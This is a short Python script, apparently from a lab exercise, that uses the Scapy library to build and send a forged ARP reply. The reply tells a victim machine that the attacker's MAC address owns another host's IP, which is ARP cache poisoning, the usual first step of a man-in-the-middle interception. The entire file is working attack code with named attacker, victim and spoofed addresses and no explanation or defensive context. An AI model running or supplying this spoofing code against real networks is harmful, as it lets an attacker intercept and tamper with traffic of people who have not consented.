from scapy.all import *

macAttacker = "08:00:27:d0:25:4b"
ipAttacker = "192.168.56.103"

macVictim = "08:00:27:b7:c4:af"
ipVictim = "192.168.56.101"

ipToSpoof = "192.168.56.102"

arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = ipToSpoof
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim

sendp(arp, iface="enp0s3")
